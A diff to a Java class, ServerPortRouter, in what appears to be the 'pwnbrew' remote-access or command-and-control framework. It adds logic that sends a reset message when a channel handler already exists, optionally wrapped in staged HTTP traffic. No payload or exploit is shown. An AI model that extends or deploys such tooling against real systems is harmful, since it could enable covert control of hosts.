@@ -48,13 +48,16 @@ package pwnbrew.network;
 import java.io.IOException;
 import java.net.InetAddress;
 import java.net.InetSocketAddress;
+import java.nio.ByteBuffer;
 import java.nio.channels.SelectionKey;
 import java.nio.channels.ServerSocketChannel;
 import java.security.GeneralSecurityException;
+import java.util.Arrays;
 import java.util.HashMap;
 import java.util.Map;
 import java.util.concurrent.Executor;
 import java.util.logging.Level;
+import pwnbrew.ClientConfig;
 import pwnbrew.log.LoggableException;
 import pwnbrew.log.RemoteLog;
 import pwnbrew.manager.ConnectionManager;
@@ -64,8 +67,10 @@ import pwnbrew.manager.PortManager;
 import pwnbrew.utilities.DebugPrinter;
 import pwnbrew.network.control.ControlMessageManager;
 import pwnbrew.network.control.messages.RelayDisconnect;
+import pwnbrew.network.http.ServerHttpWrapper;
 import pwnbrew.selector.AcceptHandler;
 import pwnbrew.selector.SocketChannelHandler;
+import pwnbrew.utilities.SocketUtilities;
 
 
 /**
@@ -253,6 +258,47 @@ public class ServerPortRouter extends PortRouter {
      */
     public boolean registerHandler(int passedSrcHostId, int channelId, SocketChannelHandler passedHandler) {
     
+        //Try the default port router
+        if( channelId != ConnectionManager.COMM_CHANNEL_ID ){
+            
+            ClientConfig theConf = ClientConfig.getConfig();
+            int theSocketPort = theConf.getSocketPort();
+            PortRouter thePR = getPortManager().getPortRouter( theSocketPort );
+
+            //Get the connection manager for the server
+            ConnectionManager aCM = thePR.getConnectionManager(-1);
+            boolean sendReset = aCM.getSocketChannelHandler( channelId ) == null;
+
+            //Send reset flag if we had to change the channel id
+            if( !sendReset ){
+
+                DebugPrinter.printMessage(NAME_Class, "Handler already exists, sending reset.");
+                //Create a byte array from the messagen byte buffe
+                RegisterMessage aMsg = new RegisterMessage(RegisterMessage.REG_RST, channelId);
+                aMsg.setDestHostId(passedSrcHostId);
+                byte[] msgBytes = aMsg.getBytes();
+
+                //If wrapping is necessary then wrap it
+                if( passedHandler.isWrapping() ){
+                    PortWrapper aWrapper = DataManager.getPortWrapper( passedHandler.getPort() );        
+                    if( aWrapper != null ){
+
+                         //Set the staged wrapper if necessary
+                        if( aWrapper instanceof ServerHttpWrapper ){
+                            ServerHttpWrapper aSrvWrapper = (ServerHttpWrapper)aWrapper;
+                            aSrvWrapper.setStaging( passedHandler.isStaged());
+                        }
+
+                        ByteBuffer aByteBuffer = aWrapper.wrapBytes( msgBytes );  
+                        msgBytes = Arrays.copyOf(aByteBuffer.array(), aByteBuffer.position());
+                    } 
+                }
+
+                passedHandler.queueBytes(msgBytes);
+                return false;
+            }
+        }
+        
         SocketChannelHandler aSCH = null;
         IncomingConnectionManager anICM = getConnectionManager(passedSrcHostId);
         if( anICM == null ){
